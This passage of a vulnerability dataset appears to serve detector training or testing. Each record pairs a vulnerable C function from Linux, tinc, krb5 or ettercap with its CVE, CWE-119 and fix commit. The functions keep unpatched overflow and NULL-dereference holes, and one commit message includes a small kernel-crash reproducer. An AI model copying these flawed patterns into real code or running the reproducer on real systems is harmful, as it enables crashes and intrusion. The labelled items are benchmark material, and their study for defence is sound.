TG3PCI_DEVICE_TIGON3_57781)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57781\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57785)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57785\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57791)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57791\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57795)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57795\");\n\t\telse\n\t\t\tgoto nomatch;\n\t} else if (tg3_asic_rev(tp) == ASIC_REV_57766) {\n\t\tif (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57762)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57762\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57766)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57766\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57782)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57782\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57786)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57786\");\n\t\telse\n\t\t\tgoto nomatch;\n\t} else if (tg3_asic_rev(tp) == ASIC_REV_5906) {\n\t\tstrcpy(tp->board_part_number, \"BCM95906\");\n\t} else {\nnomatch:\n\t\tstrcpy(tp->board_part_number, \"none\");\n\t}\n}\n", "func_hash": 112924613750397927048878971722801062246, "file_name": "tg3.c", "file_hash": 243393128707233256134232884343250797214, "cwe": ["CWE-119"], "cve": "CVE-2013-1929", "cve_desc": "Heap-based buffer overflow in the tg3_read_vpd function in drivers/net/ethernet/broadcom/tg3.c in the Linux kernel before 3.8.6 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via crafted firmware that specifies a long string in the Vital Product Data (VPD) data structure.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1929"}
{"idx": 1058, "project": "linux", "commit_id": "c0f5ecee4e741667b2493c742b60b6218d40b3aa", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/c0f5ecee4e741667b2493c742b60b6218d40b3aa", "commit_message": "USB: cdc-wdm: fix buffer overflow\n\nThe buffer for responses must not overflow.\nIf this would happen, set a flag, drop the data and return\nan error after user space has read all remaining data.\n\nSigned-off-by: Oliver Neukum <oliver@neukum.org>\nCC: stable@kernel.org\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>", "target": 1, "func": "static void wdm_in_callback(struct urb *urb)\n {\n \tstruct wdm_device *desc = urb->context;\n \tint status = urb->status;\n \n \tspin_lock(&desc->iuspin);\n \tclear_bit(WDM_RESPONDING, &desc->flags);\n\n\tif (status) {\n\t\tswitch (status) {\n\t\tcase -ENOENT:\n\t\t\tdev_dbg(&desc->intf->dev,\n\t\t\t\t\"nonzero urb status received: -ENOENT\");\n\t\t\tgoto skip_error;\n\t\tcase -ECONNRESET:\n\t\t\tdev_dbg(&desc->intf->dev,\n\t\t\t\t\"nonzero urb status received: -ECONNRESET\");\n\t\t\tgoto skip_error;\n\t\tcase -ESHUTDOWN:\n\t\t\tdev_dbg(&desc->intf->dev,\n\t\t\t\t\"nonzero urb status received: -ESHUTDOWN\");\n\t\t\tgoto skip_error;\n\t\tcase -EPIPE:\n\t\t\tdev_err(&desc->intf->dev,\n\t\t\t\t\"nonzero urb status received: -EPIPE\\n\");\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tdev_err(&desc->intf->dev,\n\t\t\t\t\"Unexpected error %d\\n\", status);\n\t\t\tbreak;\n\t\t}\n \t}\n \n \tdesc->rerr = status;\n\tdesc->reslength = urb->actual_length;\n\tmemmove(desc->ubuf + desc->length, desc->inbuf, desc->reslength);\n\tdesc->length += desc->reslength;\n skip_error:\n \twake_up(&desc->wait);\n \n\tset_bit(WDM_READ, &desc->flags);\n\tspin_unlock(&desc->iuspin);\n}\n", "func_hash": 263555284317390403116045523741699148008, "file_name": "cdc-wdm.c", "file_hash": 233028530119557432442483269940793032392, "cwe": ["CWE-119"], "cve": "CVE-2013-1860", "cve_desc": "Heap-based buffer overflow in the wdm_in_callback function in drivers/usb/class/cdc-wdm.c in the Linux kernel before 3.8.4 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted cdc-wdm USB device.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1860"}
{"idx": 1079, "project": "linux", "commit_id": "ce0030c00f95cf9110d9cdcd41e901e1fb814417", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/ce0030c00f95cf9110d9cdcd41e901e1fb814417", "commit_message": "None", "target": 1, "func": "static void call_console_drivers(unsigned start, unsigned end)\n{\n\tunsigned cur_index, start_print;\n\tstatic int msg_level = -1;\n\n\tBUG_ON(((int)(start - end)) > 0);\n\n\tcur_index = start;\n \tstart_print = start;\n \twhile (cur_index != end) {\n \t\tif (msg_level < 0 && ((end - cur_index) > 2)) {\n \t\t\t/* strip log prefix */\n\t\t\tcur_index += log_prefix(&LOG_BUF(cur_index), &msg_level, NULL);\n \t\t\tstart_print = cur_index;\n \t\t}\n \t\twhile (cur_index != end) {\n\t\t\tchar c = LOG_BUF(cur_index);\n\n\t\t\tcur_index++;\n\t\t\tif (c == '\\n') {\n\t\t\t\tif (msg_level < 0) {\n\t\t\t\t\t/*\n\t\t\t\t\t * printk() has already given us loglevel tags in\n\t\t\t\t\t * the buffer.  This code is here in case the\n\t\t\t\t\t * log buffer has wrapped right round and scribbled\n\t\t\t\t\t * on those tags\n\t\t\t\t\t */\n\t\t\t\t\tmsg_level = default_message_loglevel;\n\t\t\t\t}\n\t\t\t\t_call_console_drivers(start_print, cur_index, msg_level);\n\t\t\t\tmsg_level = -1;\n\t\t\t\tstart_print = cur_index;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t_call_console_drivers(start_print, end, msg_level);\n}\n", "func_hash": 150497347424301985399622499839907794574, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-1772", "cve_desc": "The log_prefix function in kernel/printk.c in the Linux kernel 3.x before 3.4.33 does not properly remove a prefix string from a syslog header, which allows local users to cause a denial of service (buffer overflow and system crash) by leveraging /dev/kmsg write access and triggering a call_console_drivers function call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1772"}
{"idx": 1080, "project": "tinc", "commit_id": "17a33dfd95b1a29e90db76414eb9622df9632320", "project_url": "https://github.com/gsliepen/tinc", "commit_url": "https://github.com/gsliepen/tinc/commit/17a33dfd95b1a29e90db76414eb9622df9632320", "commit_message": "Drop packets forwarded via TCP if they are too big (CVE-2013-1428).\n\nNormally all requests sent via the meta connections are checked so that they\ncannot be larger than the input buffer. However, when packets are forwarded via\nmeta connections, they are copied into a packet buffer without checking whether\nit fits into it. Since the packet buffer is allocated on the stack, this in\neffect allows an authenticated remote node to cause a stack overflow.\n\nThis issue was found by Martin Schobert.", "target": 1, "func": " void receive_tcppacket(connection_t *c, const char *buffer, int len) {\n \tvpn_packet_t outpkt;\n \n \toutpkt.len = len;\n \tif(c->options & OPTION_TCPONLY)\n \t\toutpkt.priority = 0;\n\telse\n\t\toutpkt.priority = -1;\n\tmemcpy(outpkt.data, buffer, len);\n\n\treceive_packet(c->node, &outpkt);\n}\n", "func_hash": 130046906967549597758760447336187151115, "file_name": "net_packet.c", "file_hash": 8171485538728046229010566792464281342, "cwe": ["CWE-119"], "cve": "CVE-2013-1428", "cve_desc": "Stack-based buffer overflow in the receive_tcppacket function in net_packet.c in tinc before 1.0.21 and 1.1 before 1.1pre7 allows remote authenticated peers to cause a denial of service (crash) or possibly execute arbitrary code via a large TCP packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1428"}
{"idx": 1083, "project": "krb5", "commit_id": "8ee70ec63931d1e38567905387ab9b1d45734d81", "project_url": "https://github.com/krb5/krb5", "commit_url": "https://github.com/krb5/krb5/commit/8ee70ec63931d1e38567905387ab9b1d45734d81", "commit_message": "KDC TGS-REQ null deref [CVE-2013-1416]\n\nBy sending an unusual but valid TGS-REQ, an authenticated remote\nattacker can cause the KDC process to crash by dereferencing a null\npointer.\n\nprep_reprocess_req() can cause a null pointer dereference when\nprocessing a service principal name.  Code in this function can\ninappropriately pass a null pointer to strlcpy().  Unmodified client\nsoftware can trivially trigger this vulnerability, but the attacker\nmust have already authenticated and received a valid Kerberos ticket.\n\nThe vulnerable code was introduced by the implementation of new\nservice principal realm referral functionality in krb5-1.7, but was\ncorrected as a side effect of the KDC refactoring in krb5-1.11.\n\nCVSSv2 vector: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:H/RL:O/RC:C\n\nticket: 7600 (new)\nversion_fixed: 1.10.5\nstatus: resolved", "target": 1, "func": "prep_reprocess_req(krb5_kdc_req *request, krb5_principal *krbtgt_princ)\n{\n    krb5_error_code retval = KRB5KRB_AP_ERR_BADMATCH;\n    char **realms, **cpp, *temp_buf=NULL;\n    krb5_data *comp1 = NULL, *comp2 = NULL;\n    char *comp1_str = NULL;\n\n    /* By now we know that server principal name is unknown.\n     * If CANONICALIZE flag is set in the request\n     * If req is not U2U authn. req\n     * the requested server princ. has exactly two components\n     * either\n     *      the name type is NT-SRV-HST\n     *      or name type is NT-UNKNOWN and\n     *         the 1st component is listed in conf file under host_based_services\n     * the 1st component is not in a list in conf under \"no_host_referral\"\n     * the 2d component looks like fully-qualified domain name (FQDN)\n     * If all of these conditions are satisfied - try mapping the FQDN and\n     * re-process the request as if client had asked for cross-realm TGT.\n     */\n    if (isflagset(request->kdc_options, KDC_OPT_CANONICALIZE) &&\n        !isflagset(request->kdc_options, KDC_OPT_ENC_TKT_IN_SKEY) &&\n        krb5_princ_size(kdc_context, request->server) == 2) {\n\n        comp1 = krb5_princ_component(kdc_context, request->server, 0);\n        comp2 = krb5_princ_component(kdc_context, request->server, 1);\n\n        comp1_str = calloc(1,comp1->length+1);\n        if (!comp1_str) {\n             retval = ENOMEM;\n             goto cleanup;\n         }\n        strlcpy(comp1_str,comp1->data,comp1->length+1);\n \n         if ((krb5_princ_type(kdc_context, request->server) == KRB5_NT_SRV_HST ||\n              krb5_princ_type(kdc_context, request->server) == KRB5_NT_SRV_INST ||\n             (krb5_princ_type(kdc_context, request->server) == KRB5_NT_UNKNOWN &&\n              kdc_active_realm->realm_host_based_services != NULL &&\n              (krb5_match_config_pattern(kdc_active_realm->realm_host_based_services,\n                                         comp1_str) == TRUE ||\n               krb5_match_config_pattern(kdc_active_realm->realm_host_based_services,\n                                         KRB5_CONF_ASTERISK) == TRUE))) &&\n            (kdc_active_realm->realm_no_host_referral == NULL ||\n             (krb5_match_config_pattern(kdc_active_realm->realm_no_host_referral,\n                                        KRB5_CONF_ASTERISK) == FALSE &&\n              krb5_match_config_pattern(kdc_active_realm->realm_no_host_referral,\n                                        comp1_str) == FALSE))) {\n\n            if (memchr(comp2->data, '.', comp2->length) == NULL)\n                goto cleanup;\n            temp_buf = calloc(1, comp2->length+1);\n            if (!temp_buf) {\n                 retval = ENOMEM;\n                 goto cleanup;\n             }\n            strlcpy(temp_buf, comp2->data,comp2->length+1);\n             retval = krb5int_get_domain_realm_mapping(kdc_context, temp_buf, &realms);\n             free(temp_buf);\n             if (retval) {\n                /* no match found */\n                kdc_err(kdc_context, retval, \"unable to find realm of host\");\n                goto cleanup;\n            }\n            if (realms == 0) {\n                retval = KRB5KRB_AP_ERR_BADMATCH;\n                goto cleanup;\n            }\n            /* Don't return a referral to the null realm or the service\n             * realm. */\n            if (realms[0] == 0 ||\n                data_eq_string(request->server->realm, realms[0])) {\n                free(realms[0]);\n                free(realms);\n                retval = KRB5KRB_AP_ERR_BADMATCH;\n                goto cleanup;\n            }\n            /* Modify request.\n             * Construct cross-realm tgt :  krbtgt/REMOTE_REALM@LOCAL_REALM\n             * and use it as a principal in this req.\n             */\n            retval = krb5_build_principal(kdc_context, krbtgt_princ,\n                                          (*request->server).realm.length,\n                                          (*request->server).realm.data,\n                                          \"krbtgt\", realms[0], (char *)0);\n            for (cpp = realms; *cpp; cpp++)\n                free(*cpp);\n        }\n    }\ncleanup:\n    free(comp1_str);\n\n    return retval;\n}\n", "func_hash": 26445768461799658627820158469477432629, "file_name": "do_tgs_req.c", "file_hash": 132430812994884879432256969693246573359, "cwe": ["CWE-119"], "cve": "CVE-2013-1416", "cve_desc": "The prep_reprocess_req function in do_tgs_req.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.10.5 does not properly perform service-principal realm referral, which allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted TGS-REQ request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1416"}
{"idx": 1092, "project": "linux", "commit_id": "89d7ae34cdda4195809a5a987f697a517a2a3177", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/89d7ae34cdda4195809a5a987f697a517a2a3177", "commit_message": "cipso: don't follow a NULL pointer when setsockopt() is called\n\nAs reported by Alan Cox, and verified by Lin Ming, when a user\nattempts to add a CIPSO option to a socket using the CIPSO_V4_TAG_LOCAL\ntag the kernel dies a terrible death when it attempts to follow a NULL\npointer (the skb argument to cipso_v4_validate() is NULL when called via\nthe setsockopt() syscall).\n\nThis patch fixes this by first checking to ensure that the skb is\nnon-NULL before using it to find the incoming network interface.  In\nthe unlikely case where the skb is NULL and the user attempts to add\na CIPSO option with the _TAG_LOCAL tag we return an error as this is\nnot something we want to allow.\n\nA simple reproducer, kindly supplied by Lin Ming, although you must\nhave the CIPSO DOI #3 configure on the system first or you will be\ncaught early in cipso_v4_validate():\n\n\t#include <sys/types.h>\n\t#include <sys/socket.h>\n\t#include <linux/ip.h>\n\t#include <linux/in.h>\n\t#include <string.h>\n\n\tstruct local_tag {\n\t\tchar type;\n\t\tchar length;\n\t\tchar info[4];\n\t};\n\n\tstruct cipso {\n\t\tchar type;\n\t\tchar length;\n\t\tchar doi[4];\n\t\tstruct local_tag local;\n\t};\n\n\tint main(int argc, char **argv)\n\t{\n\t\tint sockfd;\n\t\tstruct cipso cipso = {\n\t\t\t.type = IPOPT_CIPSO,\n\t\t\t.length = sizeof(struct cipso),\n\t\t\t.local = {\n\t\t\t\t.type = 128,\n\t\t\t\t.length = sizeof(struct local_tag),\n\t\t\t},\n\t\t};\n\n\t\tmemset(cipso.doi, 0, 4);\n\t\tcipso.doi[3] = 3;\n\n\t\tsockfd = socket(AF_INET, SOCK_DGRAM, 0);\n\t\t#define SOL_IP 0\n\t\tsetsockopt(sockfd, SOL_IP, IP_OPTIONS,\n\t\t\t&cipso, sizeof(struct cipso));\n\n\t\treturn 0;\n\t}\n\nCC: Lin Ming <mlin@ss.pku.edu.cn>\nReported-by: Alan Cox <alan@lxorguk.ukuu.org.uk>\nSigned-off-by: Paul Moore <pmoore@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "int cipso_v4_validate(const struct sk_buff *skb, unsigned char **option)\n{\n\tunsigned char *opt = *option;\n\tunsigned char *tag;\n\tunsigned char opt_iter;\n\tunsigned char err_offset = 0;\n\tu8 opt_len;\n\tu8 tag_len;\n\tstruct cipso_v4_doi *doi_def = NULL;\n\tu32 tag_iter;\n\n\t/* caller already checks for length values that are too large */\n\topt_len = opt[1];\n\tif (opt_len < 8) {\n\t\terr_offset = 1;\n\t\tgoto validate_return;\n\t}\n\n\trcu_read_lock();\n\tdoi_def = cipso_v4_doi_search(get_unaligned_be32(&opt[2]));\n\tif (doi_def == NULL) {\n\t\terr_offset = 2;\n\t\tgoto validate_return_locked;\n\t}\n\n\topt_iter = CIPSO_V4_HDR_LEN;\n\ttag = opt + opt_iter;\n\twhile (opt_iter < opt_len) {\n\t\tfor (tag_iter = 0; doi_def->tags[tag_iter] != tag[0];)\n\t\t\tif (doi_def->tags[tag_iter] == CIPSO_V4_TAG_INVALID ||\n\t\t\t    ++tag_iter == CIPSO_V4_TAG_MAXCNT) {\n\t\t\t\terr_offset = opt_iter;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\n\t\ttag_len = tag[1];\n\t\tif (tag_len > (opt_len - opt_iter)) {\n\t\t\terr_offset = opt_iter + 1;\n\t\t\tgoto validate_return_locked;\n\t\t}\n\n\t\tswitch (tag[0]) {\n\t\tcase CIPSO_V4_TAG_RBITMAP:\n\t\t\tif (tag_len < CIPSO_V4_TAG_RBM_BLEN) {\n\t\t\t\terr_offset = opt_iter + 1;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\n\t\t\t/* We are already going to do all the verification\n\t\t\t * necessary at the socket layer so from our point of\n\t\t\t * view it is safe to turn these checks off (and less\n\t\t\t * work), however, the CIPSO draft says we should do\n\t\t\t * all the CIPSO validations here but it doesn't\n\t\t\t * really specify _exactly_ what we need to validate\n\t\t\t * ... so, just make it a sysctl tunable. */\n\t\t\tif (cipso_v4_rbm_strictvalid) {\n\t\t\t\tif (cipso_v4_map_lvl_valid(doi_def,\n\t\t\t\t\t\t\t   tag[3]) < 0) {\n\t\t\t\t\terr_offset = opt_iter + 3;\n\t\t\t\t\tgoto validate_return_locked;\n\t\t\t\t}\n\t\t\t\tif (tag_len > CIPSO_V4_TAG_RBM_BLEN &&\n\t\t\t\t    cipso_v4_map_cat_rbm_valid(doi_def,\n\t\t\t\t\t\t\t    &tag[4],\n\t\t\t\t\t\t\t    tag_len - 4) < 0) {\n\t\t\t\t\terr_offset = opt_iter + 4;\n\t\t\t\t\tgoto validate_return_locked;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase CIPSO_V4_TAG_ENUM:\n\t\t\tif (tag_len < CIPSO_V4_TAG_ENUM_BLEN) {\n\t\t\t\terr_offset = opt_iter + 1;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\n\t\t\tif (cipso_v4_map_lvl_valid(doi_def,\n\t\t\t\t\t\t   tag[3]) < 0) {\n\t\t\t\terr_offset = opt_iter + 3;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tif (tag_len > CIPSO_V4_TAG_ENUM_BLEN &&\n\t\t\t    cipso_v4_map_cat_enum_valid(doi_def,\n\t\t\t\t\t\t\t&tag[4],\n\t\t\t\t\t\t\ttag_len - 4) < 0) {\n\t\t\t\terr_offset = opt_iter + 4;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase CIPSO_V4_TAG_RANGE:\n\t\t\tif (tag_len < CIPSO_V4_TAG_RNG_BLEN) {\n\t\t\t\terr_offset = opt_iter + 1;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\n\t\t\tif (cipso_v4_map_lvl_valid(doi_def,\n\t\t\t\t\t\t   tag[3]) < 0) {\n\t\t\t\terr_offset = opt_iter + 3;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tif (tag_len > CIPSO_V4_TAG_RNG_BLEN &&\n\t\t\t    cipso_v4_map_cat_rng_valid(doi_def,\n\t\t\t\t\t\t       &tag[4],\n\t\t\t\t\t\t       tag_len - 4) < 0) {\n\t\t\t\terr_offset = opt_iter + 4;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tbreak;\n \t\tcase CIPSO_V4_TAG_LOCAL:\n \t\t\t/* This is a non-standard tag that we only allow for\n \t\t\t * local connections, so if the incoming interface is\n\t\t\t * not the loopback device drop the packet. */\n\t\t\tif (!(skb->dev->flags & IFF_LOOPBACK)) {\n \t\t\t\terr_offset = opt_iter;\n \t\t\t\tgoto validate_return_locked;\n \t\t\t}\n\t\t\tif (tag_len != CIPSO_V4_TAG_LOC_BLEN) {\n\t\t\t\terr_offset = opt_iter + 1;\n\t\t\t\tgoto validate_return_locked;\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\terr_offset = opt_iter;\n\t\t\tgoto validate_return_locked;\n\t\t}\n\n\t\ttag += tag_len;\n\t\topt_iter += tag_len;\n\t}\n\nvalidate_return_locked:\n\trcu_read_unlock();\nvalidate_return:\n\t*option = opt + err_offset;\n\treturn err_offset;\n}\n", "func_hash": 254520361513953381472265258043035062652, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-0310", "cve_desc": "The cipso_v4_validate function in net/ipv4/cipso_ipv4.c in the Linux kernel before 3.4.8 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via an IPOPT_CIPSO IP_OPTIONS setsockopt system call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-0310"}
{"idx": 1151, "project": "linux", "commit_id": "b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c", "commit_message": "batman-adv: Only write requested number of byte to user buffer\n\nDon't write more than the requested number of bytes of an batman-adv icmp\npacket to the userspace buffer. Otherwise unrelated userspace memory might get\noverridden by the kernel.\n\nSigned-off-by: Sven Eckelmann <sven@narfation.org>\nSigned-off-by: Marek Lindner <lindner_marek@yahoo.de>", "target": 1, "func": "static ssize_t bat_socket_read(struct file *file, char __user *buf,\n\t\t\t       size_t count, loff_t *ppos)\n{\n\tstruct socket_client *socket_client = file->private_data;\n\tstruct socket_packet *socket_packet;\n\tsize_t packet_len;\n\tint error;\n\n\tif ((file->f_flags & O_NONBLOCK) && (socket_client->queue_len == 0))\n\t\treturn -EAGAIN;\n\n\tif ((!buf) || (count < sizeof(struct icmp_packet)))\n\t\treturn -EINVAL;\n\n\tif (!access_ok(VERIFY_WRITE, buf, count))\n\t\treturn -EFAULT;\n\n\terror = wait_event_interruptible(socket_client->queue_wait,\n\t\t\t\t\t socket_client->queue_len);\n\n\tif (error)\n\t\treturn error;\n\n\tspin_lock_bh(&socket_client->lock);\n\n\tsocket_packet = list_first_entry(&socket_client->queue_list,\n\t\t\t\t\t struct socket_packet, list);\n\tlist_del(&socket_packet->list);\n\tsocket_client->queue_len--;\n \n \tspin_unlock_bh(&socket_client->lock);\n \n\terror = copy_to_user(buf, &socket_packet->icmp_packet,\n\t\t\t     socket_packet->icmp_len);\n \n\tpacket_len = socket_packet->icmp_len;\n \tkfree(socket_packet);\n \n \tif (error)\n\t\treturn -EFAULT;\n\n\treturn packet_len;\n}\n", "func_hash": 85869577016758360857678073749575889128, "file_name": "icmp_socket.c", "file_hash": 220335110825043841438594946572360754188, "cwe": ["CWE-119"], "cve": "CVE-2011-4604", "cve_desc": "The bat_socket_read function in net/batman-adv/icmp_socket.c in the Linux kernel before 3.3 allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a crafted batman-adv ICMP packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4604"}
{"idx": 1176, "project": "linux", "commit_id": "d370af0ef7951188daeb15bae75db7ba57c67846", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/d370af0ef7951188daeb15bae75db7ba57c67846", "commit_message": "irda: validate peer name and attribute lengths\n\nLength fields provided by a peer for names and attributes may be longer\nthan the destination array sizes.  Validate lengths to prevent stack\nbuffer overflows.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: stable@kernel.org\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "static void iriap_getvaluebyclass_indication(struct iriap_cb *self,\n\t\t\t\t\t     struct sk_buff *skb)\n{\n\tstruct ias_object *obj;\n\tstruct ias_attrib *attrib;\n\tint name_len;\n\tint attr_len;\n\tchar name[IAS_MAX_CLASSNAME + 1];\t/* 60 bytes */\n\tchar attr[IAS_MAX_ATTRIBNAME + 1];\t/* 60 bytes */\n\t__u8 *fp;\n\tint n;\n\n\tIRDA_DEBUG(4, \"%s()\\n\", __func__);\n\n\tIRDA_ASSERT(self != NULL, return;);\n\tIRDA_ASSERT(self->magic == IAS_MAGIC, return;);\n\tIRDA_ASSERT(skb != NULL, return;);\n\n\tfp = skb->data;\n \tn = 1;\n \n \tname_len = fp[n++];\n \tmemcpy(name, fp+n, name_len); n+=name_len;\n \tname[name_len] = '\\0';\n \n \tattr_len = fp[n++];\n \tmemcpy(attr, fp+n, attr_len); n+=attr_len;\n \tattr[attr_len] = '\\0';\n \n\tIRDA_DEBUG(4, \"LM-IAS: Looking up %s: %s\\n\", name, attr);\n\tobj = irias_find_object(name);\n\n\tif (obj == NULL) {\n\t\tIRDA_DEBUG(2, \"LM-IAS: Object %s not found\\n\", name);\n\t\tiriap_getvaluebyclass_response(self, 0x1235, IAS_CLASS_UNKNOWN,\n\t\t\t\t\t       &irias_missing);\n\t\treturn;\n\t}\n\tIRDA_DEBUG(4, \"LM-IAS: found %s, id=%d\\n\", obj->name, obj->id);\n\n\tattrib = irias_find_attrib(obj, attr);\n\tif (attrib == NULL) {\n\t\tIRDA_DEBUG(2, \"LM-IAS: Attribute %s not found\\n\", attr);\n\t\tiriap_getvaluebyclass_response(self, obj->id,\n\t\t\t\t\t       IAS_ATTRIB_UNKNOWN,\n\t\t\t\t\t       &irias_missing);\n\t\treturn;\n\t}\n\n\t/* We have a match; send the value.  */\n\tiriap_getvaluebyclass_response(self, obj->id, IAS_SUCCESS,\n\t\t\t\t       attrib->value);\n}\n", "func_hash": 289039370717523292092463182568935459370, "file_name": "iriap.c", "file_hash": 294293270431801760606108261927776973010, "cwe": ["CWE-119"], "cve": "CVE-2011-1180", "cve_desc": "Multiple stack-based buffer overflows in the iriap_getvaluebyclass_indication function in net/irda/iriap.c in the Linux kernel before 2.6.39 allow remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging connectivity to an IrDA infrared network and sending a large integer value for a (1) name length or (2) attribute length.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-1180"}
{"idx": 1184, "project": "linux", "commit_id": "f2e323ec96077642d397bb1c355def536d489d16", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/f2e323ec96077642d397bb1c355def536d489d16", "commit_message": "[media] ttusb-dec: buffer overflow in ioctl\n\nWe need to add a limit check here so we don't overflow the buffer.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>", "target": 1, "func": "static int ttusbdecfe_dvbs_diseqc_send_master_cmd(struct dvb_frontend* fe, struct dvb_diseqc_master_cmd *cmd)\n{\n\tstruct ttusbdecfe_state* state = (struct ttusbdecfe_state*) fe->demodulator_priv;\n\tu8 b[] = { 0x00, 0xff, 0x00, 0x00,\n \t\t   0x00, 0x00, 0x00, 0x00,\n \t\t   0x00, 0x00 };\n \n \tmemcpy(&b[4], cmd->msg, cmd->msg_len);\n \n \tstate->config->send_command(fe, 0x72,\n\t\t\t\t    sizeof(b) - (6 - cmd->msg_len), b,\n\t\t\t\t    NULL, NULL);\n\n\treturn 0;\n}\n", "func_hash": 192608949045328579601369441585250086987, "file_name": "ttusbdecfe.c", "file_hash": 24169251397313178037362556408074084271, "cwe": ["CWE-119"], "cve": "CVE-2014-8884", "cve_desc": "Stack-based buffer overflow in the ttusbdecfe_dvbs_diseqc_send_master_cmd function in drivers/media/usb/ttusb-dec/ttusbdecfe.c in the Linux kernel before 3.17.4 allows local users to cause a denial of service (system crash) or possibly gain privileges via a large message length in an ioctl call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-8884"}
{"idx": 1205, "project": "ettercap", "commit_id": "e3abe7d7585ecc420a7cab73313216613aadad5a", "project_url": "https://github.com/Ettercap/ettercap", "commit_url": "https://github.com/Ettercap/ettercap/commit/e3abe7d7585ecc420a7cab73313216613aadad5a", "commit_message": "Fixed heap overflow caused by length", "target": 1, "func": "FUNC_DECODER(dissector_postgresql)\n{\n   DECLARE_DISP_PTR(ptr);\n   struct ec_session *s = NULL;\n   void *ident = NULL;\n   char tmp[MAX_ASCII_ADDR_LEN];\n   struct postgresql_status *conn_status;\n\n   /* don't complain about unused var */\n   (void) DECODE_DATA; \n   (void) DECODE_DATALEN;\n   (void) DECODED_LEN;\n   \n   if (FROM_CLIENT(\"postgresql\", PACKET)) {\n      if (PACKET->DATA.len < 4)\n         return NULL;\n\n      dissect_create_ident(&ident, PACKET, DISSECT_CODE(dissector_postgresql));\n\n      /* if the session does not exist... */\n      if (session_get(&s, ident, DISSECT_IDENT_LEN) == -ENOTFOUND) {\n         /* search for user and database strings, look for StartupMessage  */\n         unsigned char *u = memmem(ptr, PACKET->DATA.len, \"user\", 4);\n         unsigned char *d = memmem(ptr, PACKET->DATA.len, \"database\", 8);\n         if (!memcmp(ptr + 4, \"\\x00\\x03\\x00\\x00\", 4) && u && d) {\n            /* create the new session */\n            dissect_create_session(&s, PACKET, DISSECT_CODE(dissector_postgresql));\n\n            /* remember the state (used later) */\n            SAFE_CALLOC(s->data, 1, sizeof(struct postgresql_status));\n\n            conn_status = (struct postgresql_status *) s->data;\n            conn_status->status = WAIT_AUTH;\n\n            /* user is always null-terminated */\n            strncpy((char*)conn_status->user, (char*)(u + 5), 65);\n            conn_status->user[64] = 0;\n\n            /* database is always null-terminated */\n            strncpy((char*)conn_status->database, (char*)(d + 9), 65);\n            conn_status->database[64] = 0;\n\n            /* save the session */\n            session_put(s);\n         }\n      } else {\n         conn_status = (struct postgresql_status *) s->data;\n         if (conn_status->status == WAIT_RESPONSE) {\n\n            /* check for PasswordMessage packet */\n            if (ptr[0] == 'p' && conn_status->type == MD5) {\n               